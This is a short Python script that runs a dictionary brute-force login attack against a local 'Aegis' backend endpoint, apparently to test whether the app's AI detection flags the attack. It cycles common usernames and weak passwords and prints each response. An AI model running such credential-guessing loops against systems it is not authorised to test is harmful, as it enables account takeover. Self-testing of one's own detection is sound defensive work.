import requests
import time

# Target YOUR Aegis backend API endpoint
TARGET_URL = "http://localhost:8000/login-attempt"    # Backend endpoint, not frontend

SUCCESS_INDICATOR = "Success"

# Test credentials that make sense for your app
usernames = ["admin", "root", "administrator", "user@bakery.com"]
passwords = ["password", "123456", "admin", "letmein", "qwerty", "welcome"]

# Optional: Comment out proxies if you're not using Burp Suite
# proxies = {
#     "http": "http://127.0.0.1:8081"
# }

headers = {
    "Content-Type": "application/json"
}

session = requests.Session()
# session.proxies = proxies  # Uncomment if using Burp

print("=" * 60)
print("Starting brute force attack on Aegis Backend")
print("=" * 60)

attack_count = 0
for username in usernames:
    for password in passwords:
        payload = {
            "username": username,
            "password": password,
            "ip": "192.168.1.100"  # Fake IP for testing
        }
        
        print(f"\n[{attack_count+1}] Attempt: {username}:{password}")
        
        try:
            response = session.post(
                TARGET_URL,
                json=payload,
                headers=headers,
                timeout=3
            )
            
            print(f"Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                print(f"Response: {data}")
                
                # Check if AI detected this as a hack
                if data.get('analysis_result', {}).get('detected_hack'):
                    print("🚨🚨🚨 AI DETECTED BRUTE FORCE ATTACK! System should lock now.")
                elif data.get('analysis_result', {}).get('summary'):
                    print(f"AI Analysis: {data['analysis_result']['summary']}")
            else:
                print(f"Failed with status {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print("❌ Backend not reachable – is the server running?")
        except Exception as e:
            print(f"❌ Error: {e}")
        
        attack_count += 1
        time.sleep(0.5)  # Delay between attempts

print("\n" + "=" * 60)
print(f"Completed {attack_count} login attempts")
print("=" * 60)